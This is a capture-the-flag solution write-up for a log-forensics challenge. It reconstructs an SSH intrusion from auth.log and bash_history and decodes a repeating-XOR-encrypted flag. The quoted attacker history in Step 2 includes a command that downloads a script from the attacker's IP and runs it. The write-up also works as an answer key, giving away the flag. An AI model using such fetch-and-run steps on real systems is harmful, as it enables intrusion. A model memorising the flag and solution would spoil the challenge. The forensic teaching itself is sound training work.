---
title: bulletproof-tenant-2
category: misc
difficulty: TBD
points: 100-500
author: s4l1
date: 2026-11-01
---
# Solution — Bulletproof Tenant 2

**Flag:** `ingehack{x0r_1s_n0t_3ncryp1t10n}`

---

## Step 1 — Log analysis (`auth.log`)

Reading the auth log tells the same story as Part 1, but with an ending:

- A wall of `Failed password` lines for `root` and `admin` from `179.43.153.2`.
- At **03:16:46** one line stands out:

  ```
  Oct 24 03:16:46 honeypot sshd[2387]: Accepted password for deploy from 179.43.153.2 port 51902 ssh2
  ```

  The attacker got in as **`deploy`**, on client port **`51902`** — and the
  session stayed open until **03:17:30**.

That line is not just context this time: the port is the key. Keep it.

## Step 2 — Correlate with `bash_history`

The attacker's shell history shows the full chain:

```
wget http://179.43.153.2/encode.py -O /tmp/encode.py
cat /tmp/encode.py
python3 /tmp/encode.py /home/deploy/flag.txt /home/deploy/flag.txt.enc
ls -la /home/deploy/flag.txt*
cat /home/deploy/flag.txt.enc
```

So the original `flag.txt` was replaced by `flag.txt.enc`, produced by
`/tmp/encode.py`. No key appears anywhere in the history — it has to come
from the session the command ran in.

## Step 3 — Read the script (`encode.py`)

```python
def session_key() -> bytes:
    client = os.environ.get("SSH_CLIENT", "").split()
    if len(client) < 2:
        sys.exit("encode.py: no SSH session (SSH_CLIENT unset); pass --key")
    return client[1].encode()


def encode(data: bytes, key: bytes) -> str:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data)).hex()
```

`SSH_CLIENT` is set by `sshd` in the login shell and looks like
`<ip> <client-port> <server-port>`, so `client[1]` is the client port. The
script XORs the file with that port as a **repeating key** and writes a
lowercase hex string.

For the `deploy` session from Step 1 the key is therefore the five ASCII
bytes:

```
b"51902"
```

## Step 4 — Reverse it

Hex-decode the blob, then XOR every byte with the repeated key. Both halves
of the key come from the log, so this is the step the log exists for.

```python
key = b"51902"
with open("flag.txt.enc") as f:
    data = bytes.fromhex(f.read().strip())
print(bytes(b ^ key[i % len(key)] for i, b in enumerate(data)).decode())
```

Output:

```
ingehack{x0r_1s_n0t_3ncryp1t10n}
```

Sanity check: the blob is 64 hex characters (32 bytes), matching the
32-character plaintext.

---

## Skills learned

| Step | Skill |
|---|---|
| 1 | Reading `sshd` auth logs, spotting the successful login among brute-force noise |
| 2 | Correlating artifacts (auth log → shell history) to reconstruct a session |
| 3 | Reading a short Python script to identify the key source and the transform (repeating XOR + hex) |
| 4 | Writing the inverse of a simple encoder, using a key recovered from the logs |

## Author notes

- The log is load-bearing: the encoder has no hardcoded key, so the ciphertext
  cannot be decoded without the client port of the `deploy` session, and that
  port exists only in `auth.log`.
- The key is the port as a decimal **string** (`b"51902"`), not the integer
  `51902` and not `0x37` from the original version — a solver who reads the
  script sees `client[1].encode()` and the units are unambiguous.
- `encode.py --key <material>` exists only so a player can re-run the tool
  offline; in the story the attacker ran it inside the session.
- The attacker's `rm -f /home/deploy/notes.txt` is flavour; it has nothing to
  do with the flag.
- All four attachments are needed: `auth.log` (the key and how they got in),
  `bash_history` (what they did), `encode.py` (how the key is derived and
  applied), `flag.txt.enc` (the data to recover).
